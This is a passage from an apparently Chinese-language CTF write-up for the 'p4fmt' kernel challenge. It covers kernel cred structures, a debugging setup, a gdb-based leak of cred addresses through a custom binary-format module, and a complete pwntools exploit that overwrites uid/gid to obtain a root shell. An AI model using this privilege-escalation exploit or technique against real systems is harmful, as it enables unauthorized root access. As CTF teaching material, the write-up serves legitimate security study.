  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BINPRM_BUF_SIZE</span><span class="p">];</span>
 <span class="cp">#ifdef CONFIG_MMU</span>
  <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">vma_pages</span><span class="p">;</span>
 <span class="cp">#else</span>
 <span class="cp"># define MAX_ARG_PAGES 32</span>
  <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">[</span><span class="n">MAX_ARG_PAGES</span><span class="p">];</span>
 <span class="cp">#endif</span>
  <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">p</span><span class="p">;</span> <span class="cm">/* current top of mem */</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">argmin</span><span class="p">;</span> <span class="cm">/* rlimit marker for copy_strings() */</span>
  <span class="kt">unsigned</span> <span class="kt">int</span>
    <span class="cm">/*</span>
<span class="cm">    * True after the bprm_set_creds hook has been called once</span>
<span class="cm">    * (multiple calls can be made via prepare_binprm() for</span>
<span class="cm">    * binfmt_script/misc).</span>
<span class="cm">    */</span>
    <span class="nl">called_set_creds</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="cm">/*</span>
<span class="cm">    * True if most recent call to the commoncaps bprm_set_creds</span>
<span class="cm">    * hook (due to multiple prepare_binprm() calls from the</span>
<span class="cm">    * binfmt_script/misc handlers) resulted in elevated</span>
<span class="cm">    * privileges.</span>
<span class="cm">    */</span>
    <span class="nl">cap_elevated</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
    <span class="cm">/*</span>
<span class="cm">    * Set by bprm_set_creds hook to indicate a privilege-gaining</span>
<span class="cm">    * exec has happened. Used to sanitize execution environment </span>
<span class="cm">   * and to set AT_SECURE auxv for glibc.</span>
<span class="cm">    */</span>
    <span class="nl">secureexec</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
 <span class="cp">#ifdef __alpha__</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">taso</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="cp">#endif</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">recursion_depth</span><span class="p">;</span> <span class="cm">/* only for search_binary_handler() */</span>
  <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span> <span class="n">file</span><span class="p">;</span> 
 <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">cred</span><span class="p">;</span> <span class="cm">/* new credentials */</span>
  <span class="kt">int</span> <span class="n">unsafe</span><span class="p">;</span>   <span class="cm">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">per_clear</span><span class="p">;</span> <span class="cm">/* bits to clear in current-&amp;gt;personality */</span>
  <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">envc</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">filename</span><span class="p">;</span> <span class="cm">/* Name of binary as seen by procps */</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">interp</span><span class="p">;</span> <span class="cm">/* Name of the binary really executed. Most</span>
<span class="cm">   of the time same as filename, but could be</span>
<span class="cm">   different for binfmt_{misc,script} */</span>
  <span class="kt">unsigned</span> <span class="n">interp_flags</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">interp_data</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">loader</span><span class="p">,</span> <span class="n">exec</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim_stack</span><span class="p">;</span> <span class="cm">/* Saved RLIMIT_STACK used during exec. */</span>
 <span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
</pre></div>
<p><strong>关于cred：</strong></p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
    <span class="n">atomic_t</span>    <span class="n">usage</span><span class="p">;</span>
<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS</span>
    <span class="n">atomic_t</span>    <span class="n">subscribers</span><span class="p">;</span>    <span class="cm">/* number of processes subscribed */</span>
    <span class="kt">void</span>        <span class="o">*</span><span class="n">put_addr</span><span class="p">;</span>
    <span class="kt">unsigned</span>    <span class="n">magic</span><span class="p">;</span>
<span class="cp">#define CRED_MAGIC  0x43736564</span>
<span class="cp">#define CRED_MAGIC_DEAD 0x44656144</span>
<span class="cp">#endif</span>
    <span class="n">kuid_t</span>      <span class="n">uid</span><span class="p">;</span>        <span class="cm">/* real UID of the task */</span>
    <span class="n">kgid_t</span>      <span class="n">gid</span><span class="p">;</span>        <span class="cm">/* real GID of the task */</span>
    <span class="n">kuid_t</span>      <span class="n">suid</span><span class="p">;</span>       <span class="cm">/* saved UID of the task */</span>
    <span class="n">kgid_t</span>      <span class="n">sgid</span><span class="p">;</span>       <span class="cm">/* saved GID of the task */</span>
    <span class="n">kuid_t</span>      <span class="n">euid</span><span class="p">;</span>       <span class="cm">/* effective UID of the task */</span>
    <span class="n">kgid_t</span>      <span class="n">egid</span><span class="p">;</span>       <span class="cm">/* effective GID of the task */</span>
    <span class="n">kuid_t</span>      <span class="n">fsuid</span><span class="p">;</span>      <span class="cm">/* UID for VFS ops */</span>
    <span class="n">kgid_t</span>      <span class="n">fsgid</span><span class="p">;</span>      <span class="cm">/* GID for VFS ops */</span>
    <span class="kt">unsigned</span>    <span class="n">securebits</span><span class="p">;</span> <span class="cm">/* SUID-less security management */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_permitted</span><span class="p">;</span>  <span class="cm">/* caps we're permitted */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_effective</span><span class="p">;</span>  <span class="cm">/* caps we can actually use */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_bset</span><span class="p">;</span>   <span class="cm">/* capability bounding set */</span>
    <span class="n">kernel_cap_t</span>    <span class="n">cap_ambient</span><span class="p">;</span>    <span class="cm">/* Ambient capability set */</span>
<span class="cp">#ifdef CONFIG_KEYS</span>
    <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="n">jit_keyring</span><span class="p">;</span>    <span class="cm">/* default keyring to attach requested</span>
<span class="cm">                     * keys to */</span>
    <span class="k">struct</span> <span class="n">key</span> <span class="n">__rcu</span> <span class="o">*</span><span class="n">session_keyring</span><span class="p">;</span> <span class="cm">/* keyring inherited over fork */</span>
    <span class="k">struct</span> <span class="n">key</span>  <span class="o">*</span><span class="n">process_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this process */</span>
    <span class="k">struct</span> <span class="n">key</span>  <span class="o">*</span><span class="n">thread_keyring</span><span class="p">;</span> <span class="cm">/* keyring private to this thread */</span>
    <span class="k">struct</span> <span class="n">key</span>  <span class="o">*</span><span class="n">request_key_auth</span><span class="p">;</span> <span class="cm">/* assumed request_key authority */</span>
<span class="cp">#endif</span>
<span class="cp">#ifdef CONFIG_SECURITY</span>
    <span class="kt">void</span>        <span class="o">*</span><span class="n">security</span><span class="p">;</span>  <span class="cm">/* subjective LSM security */</span>
<span class="cp">#endif</span>
    <span class="k">struct</span> <span class="n">user_struct</span> <span class="o">*</span><span class="n">user</span><span class="p">;</span>   <span class="cm">/* real user ID subscription */</span>
    <span class="k">struct</span> <span class="n">user_namespace</span> <span class="o">*</span><span class="n">user_ns</span><span class="p">;</span> <span class="cm">/* user_ns the caps and keyrings are relative to. */</span>
    <span class="k">struct</span> <span class="n">group_info</span> <span class="o">*</span><span class="n">group_info</span><span class="p">;</span>  <span class="cm">/* supplementary groups for euid/fsgid */</span>
    <span class="k">struct</span> <span class="n">rcu_head</span> <span class="n">rcu</span><span class="p">;</span>        <span class="cm">/* RCU deletion hook */</span>
<span class="p">};</span>
</pre></div>
<p><strong>cred是每个线程记录本线程权限的结构体<br/>
当我们将uid和gid覆盖为0即可使此线程获得root权限<br/>
(root运行下uid和gid皆为0)</strong></p>
<h3 data-content="1" id="45e3ac94151eb9fb12d8f015dfb1e63a">Debug</h3>
<p>关于调试和leak cred<br/>
<strong>首先为了便于调试，将身份改为root，修改init脚本并重新打包文件系统：</strong></p>
<pre><code>#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
insmod  /p4fmt.ko  

sleep 2

ln -s /dev/console /dev/ttyS0

cat &lt;&lt;EOF
====================
p4fmt
====================

Kernel challs are always a bit painful.
No internet access, no SSH, no file copying.

You're stuck with copy pasting base64'd (sometimes static) ELFs.
But what if there was another solution?

We've created a lightweight, simple binary format for your
pwning pleasure. It's time to prove your skills.

EOF

setsid cttyhack su root
poweroff -f</code></pre>
<p>而后重新打包文件系统：</p>
<pre><code>find . | cpio -o -H  newc |gzip -9 &gt; ../kirin.cpio.gz</code></pre>
<p>而后从bzImage提取vmlinux便于调试：</p>
<pre><code>#!/bin/sh
check_vmlinux()
{
    # Use readelf to check if it's a valid ELF
    # TODO: find a better to way to check that it's really vmlinux
    #       and not just an elf
    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1

    cat $1
    exit 0
}

try_decompress()
{
    # The obscure use of the "tr" filter is to work around older versions of
    # "grep" that report the byte offset of the line instead of the pattern.

    # Try to find the header ($1) and decompress from here
    for pos in `tr "$1\n$2" "\n$2=" &lt; "$img" | grep -abo "^$2"`
    do
        pos=${pos%%:*}
        tail -c+$pos "$img" | $3 &gt; $tmp 2&gt; /dev/null
        check_vmlinux $tmp
    done
}

# Check invocation:
me=${0##*/}
img=$1
if  [ $# -ne 1 -o ! -s "$img" ]
then
    echo "Usage: $me &lt;kernel-image&gt;" &gt;&amp;2
    exit 2
fi

# Prepare temp files:
tmp=$(mktemp /tmp/vmlinux-XXX)
trap "rm -f $tmp" 0

# That didn't work, so retry after decompression.
try_decompress '\037\213\010' xy    gunzip
try_decompress '\3757zXZ\000' abcde unxz
try_decompress 'BZh'          xy    bunzip2
try_decompress '\135\0\0\0'   xxx   unlzma
try_decompress '\211\114\132' xy    'lzop -d'
try_decompress '\002!L\030'   xxx   'lz4 -d'
try_decompress '(\265/\375'   xxx   unzstd

# Finally check for uncompressed images or objects:
check_vmlinux $img

# Bail out:
echo "$me: Cannot find vmlinux." &gt;&amp;2</code></pre>
<p>运行：</p>
<pre><code>kirin.sh  ./bzImage  &gt; ./vmlinux</code></pre>
<p>最后更改qemu启动脚本以便调试内核：</p>
<pre><code>#!/bin/bash
qemu-system-x86_64 -s  -kernel ./bzImage \
        -initrd ./kirin.cpio.gz \
        -nographic \
        -append "console=ttyS0 nokaslr" \
#-s:1234端口调试内核
#nokaslr关闭内核地址随机，便于调试</code></pre>
<p>运行gdb连接即可：</p>
<pre><code>/ # whoami
root
/ # cat /proc/modules 
p4fmt 16384 0 - Live 0xffffffffc0000000 (O)
qemu虚拟机下看到p4fmt模块的加载地址
连接gdb并加载符号表：
gdb ./vmlinux
target remote 127.0.0.1:1234
add-symbol-file ./p4fmt.ko 0xffffffffc0000000</code></pre>
<p><strong>关于leak：</strong><br/>
在load_p4_binary调用install_exec_creds时下断点</p>
<pre><code>b *0xffffffffc00000af</code></pre>
<p>而后随意写一个满足上面格式的程序运行，gdb断在install_exec_creds以便查看cred相对bprm的偏移<br/>
实际上可以直接查看汇编：</p>
<pre><code>x/10i 0xffffffffc00000af
pwndbg&gt; x/10i 0xffffffffc00000af
   0xffffffffc00000af &lt;load_p4_binary+175&gt;: call   0xffffffff81189ec0
   0xffffffffc00000b4 &lt;load_p4_binary+180&gt;: mov    rdi,0xffffffffc0002000
   0xffffffffc00000bb &lt;load_p4_binary+187&gt;: call   0xffffffff8118a130
   0xffffffffc00000c0 &lt;load_p4_binary+192&gt;: movabs rsi,0x7ffffffff000
   0xffffffffc00000ca &lt;load_p4_binary+202&gt;: mov    rax,QWORD PTR gs:0x14d40
   0xffffffffc00000d3 &lt;load_p4_binary+211&gt;: mov    rdx,QWORD PTR [rax]
   0xffffffffc00000d6 &lt;load_p4_binary+214&gt;: test   edx,0x20000000
   0xffffffffc00000dc &lt;load_p4_binary+220&gt;: je     0xffffffffc00000f3 &lt;load_p4_binary+243&gt;
   0xffffffffc00000de &lt;load_p4_binary+222&gt;: test   BYTE PTR [rax+0x83],0x8
   0xffffffffc00000e5 &lt;load_p4_binary+229&gt;: mov    esi,0xc0000000</code></pre>
<p>跟进0xffffffff81189ec0：</p>
<pre><code>pwndbg&gt; x/10i 0xffffffff81189ec0
=&gt; 0xffffffff81189ec0:  push   rbx
   0xffffffff81189ec1:  mov    rbx,rdi
   0xffffffff81189ec4:  call   0xffffffff81297aa0
   0xffffffff81189ec9:  mov    rdi,QWORD PTR [rbx+0xe0]
   0xffffffff81189ed0:  call   0xffffffff81073d30
   0xffffffff81189ed5:  mov    QWORD PTR [rbx+0xe0],0x0
   0xffffffff81189ee0:  mov    rdi,QWORD PTR gs:0x14d40
   0xffffffff81189ee9:  mov    rax,QWORD PTR [rdi+0x100]
   0xffffffff81189ef0:  mov    rax,QWORD PTR [rax+0x148]
   0xffffffff81189ef7:  and    eax,0x3</code></pre>
<p>可以看到偏移位置为0xe0<br/>
随意运行一个调试:</p>
<pre><code>pwndbg&gt; x/30xg 0xffff8880077b2400
0xffff8880077b2400: 0xffff888007530020  0xffff8880077d7280
0xffff8880077b2410: 0x0000000000000000  0xffff888007530020
0xffff8880077b2420: 0x0000000000000000  0x00007fffffdff030
0xffff8880077b2430: 0x0000000000000000  0x0000000000000000
0xffff8880077b2440: 0x0000000600000000  0x0000000101003450
0xffff8880077b2450: 0x0000000000000090  0xffffffff89262008
0xffff8880077b2460: 0x0000000000002000  0x0000000000000000
0xffff8880077b2470: 0x6262626262626262  0x6161616161616161
0xffff8880077b2480: 0x6161616161616161  0x6161616161616161
0xffff8880077b2490: 0x6161616161616161  0x6161616161616161
0xffff8880077b24a0: 0x6161616161616161  0x6161616161616161
0xffff8880077b24b0: 0x6161616161616161  0x6161616161616161
0xffff8880077b24c0: 0x6161616161616161  0x00007fffffffefae
0xffff8880077b24d0: 0x0000000100000001  0x0000000000000000
0xffff8880077b24e0: 0xffff88800756c3c0  0x0000000000000000
pwndbg&gt; x/20xg 0xffff88800756c3c0
0xffff88800756c3c0: 0x0000000000000000  0xffff88800770f440
0xffff88800756c3d0: 0x0000003fffffffff  0x0000000000000000
0xffff88800756c3e0: 0x0000000000000000  0x0000000000000000
0xffff88800756c3f0: 0xffffffff00000000  0x000000000000003f
0xffff88800756c400: 0x0000003fffffffff  0x0000000000000000
0xffff88800756c410: 0x0000000000000000  0x0000000000000000
0xffff88800756c420: 0x0000000000000000  0xffffffff81c38280
0xffff88800756c430: 0x0000000000000000  0x0000000000000000
0xffff88800756c440: 0x0000000000000001  0x0000000000000000
0xffff88800756c450: 0x0000000000000000  0x0000000000000000</code></pre>
<p><strong>可以看到偏移0xe0位置为0xffff88800756c3c0<br/>
而0xffff88800756c3c0下对应uid和gid位置都为0(debug时是root身份)<br/>
同而注意到程序会打印vmmap和clear_user的参数<br/>
因此可以将map_info_offset指向这里来vmmap(偏移位置为0xe0，即距离文件头偏移：0xe0-0x48=0x98位置，但是load_addr有位运算操作再传参并输出，因此这里选择设置map_info_offset为0x90,使length为cred_addr并leak)，此时即会打印出cred的地址，虽然最后会crash，不过能leak一次cred地址<br/>
这里注意，开启内核地址随机化时cred地址线程间并不相同<br/>
但是真实环境下可以观察到cred地址会是一组地址的循环,因此可以预估下次程序启动时cred地址从而覆盖掉uid和gid完成提权<br/>
leak:</strong></p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span>  <span class="o">*</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s2">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s2">"P4"</span>             
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1"># version</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1"># type</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1"># map_count</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x90</span><span class="p">)</span><span class="c1">#map_info_offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>     <span class="c1"># entry</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s2">"kirin"</span>
<span class="k">print</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"base64"</span><span class="p">)</span>
<span class="c1">#output=UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=</span>
</pre></div>
<pre><code>echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d &gt; /tmp/kirin
chmod +x  /tmp/kirin
/tmp/kirin</code></pre>
<p>可以看到cred地址规律：</p>
<pre><code>/tmp $ ./kirin
[  310.536033] vm_mmap(load_addr=0x0, length=0xffff90e845d72300, offset=0x0, prot=0)
[  310.538726] kirin[559]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
[  310.543394] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  311.480867] vm_mmap(load_addr=0x0, length=0xffff90e845d729c0, offset=0x0, prot=0)
[  311.483814] kirin[560]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
[  311.486224] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  312.793369] vm_mmap(load_addr=0x0, length=0xffff90e845d72cc0, offset=0x0, prot=0)
[  312.797228] kirin[561]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
[  312.804765] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  314.042323] vm_mmap(load_addr=0x0, length=0xffff90e845d72b40, offset=0x0, prot=0)
[  314.045054] kirin[562]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
[  314.047779] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  315.349773] vm_mmap(load_addr=0x0, length=0xffff90e845d72840, offset=0x0, prot=0)
[  315.352563] kirin[563]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
[  315.357168] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  316.229283] vm_mmap(load_addr=0x0, length=0xffff90e845d72300, offset=0x0, prot=0)
[  316.232561] kirin[564]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
[  316.234984] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  316.954076] vm_mmap(load_addr=0x0, length=0xffff90e845d729c0, offset=0x0, prot=0)
[  316.957635] kirin[565]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
[  316.960276] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  317.663571] vm_mmap(load_addr=0x0, length=0xffff90e845d72cc0, offset=0x0, prot=0)
[  317.667293] kirin[566]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
[  317.669847] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  318.516134] vm_mmap(load_addr=0x0, length=0xffff90e845d72b40, offset=0x0, prot=0)
[  318.518924] kirin[567]: segfault at 0 ip 0000000000000000 sp 00007fffffffdf91 error 14
[  318.522188] Code: Bad RIP value.
Segmentation fault
/tmp $ ./kirin
[  319.341463] vm_mmap(load_addr=0x0, length=0xffff90e845d72840, offset=0x0, prot=0)
[  319.343774] kirin[568]: segfault at 0 ip 0000000000000000 sp 00007fffffffef91 error 14
[  319.346129] Code: Bad RIP value.
Segmentation fault
/tmp $</code></pre>
<p>可以看到每五个一个循环(至少在短时间内是这样)<br/>
所以我们完全可以leak出一次循环后猜测下次cred位置，而后提权到root拿到flag<br/>
<strong>但是我在编写exp时遇到了问题<br/>
最初想法是leak出五个地址，而后利用循环预测<br/>
但是其实一段时间之后，这五个地址会变化，不过也会循环，这样虽然可以把所有可能情况列举生成exp，然后再预测，不过有点太麻烦<br/>
所以最终选择leak处一个地址后直接循环此exp，减小中间的时间(我并不确定内核的这种地址循环是时间还是轮数问题)，很大地提高了命中率(约为100%)</strong></p>
<h3 data-content="1" id="465948dfbfc12068918727bdba4534ae">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#context.log_level="debug"</span>

<span class="k">def</span> <span class="nf">get_payload</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
    <span class="n">payload</span><span class="o">=</span><span class="s2">"P4"</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#version</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="c1">#type</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="c1">#map_info_num</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x18</span><span class="p">)</span><span class="c1">#map_info_offset</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400048</span><span class="p">)</span><span class="c1">#entry</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="o">|</span><span class="mi">7</span><span class="p">)</span><span class="c1">#port=7-&gt;rwx</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="c1">#length</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="c1">#offset</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">((</span><span class="n">addr</span><span class="o">|</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="c1">#cred</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span><span class="c1">#overwrite_length</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">sh</span><span class="p">(),</span><span class="n">arch</span><span class="o">=</span><span class="s2">"amd64"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"base64"</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">"./run.sh"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"/ $ "</span><span class="p">,</span><span class="s1">'echo -n "UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAa2lyaW4=" | base64 -d &gt; /tmp/kirin; chmod +x /tmp/kirin'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"/ $ "</span><span class="p">,</span><span class="s2">"/tmp/kirin"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"length="</span><span class="p">)</span>
<span class="n">addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">","</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
<span class="n">exp</span><span class="o">=</span><span class="n">get_payload</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
<span class="n">cmd</span><span class="o">=</span><span class="s1">'echo -n "</span><span class="si">%s</span><span class="s1">" | base64 -d &gt; /tmp/exp; chmod +x /tmp/exp'</span> <span class="o">%</span><span class="n">exp</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"/ $ "</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"$ "</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"/tmp/exp"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"/ "</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">ans</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  
    <span class="k">print</span> <span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 
    <span class="k">if</span> <span class="n">ans</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s1">'#'</span><span class="p">:</span>
        <span class="k">print</span> <span class="s2">"Get Shell Successfully"</span>
        <span class="k">break</span>
    <span class="k">if</span> <span class="n">i</span><span class="o">==</span><span class="mi">9</span><span class="p">:</span>
        <span class="k">print</span> <span class="s2">"Failed this time,please try again!"</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
</div>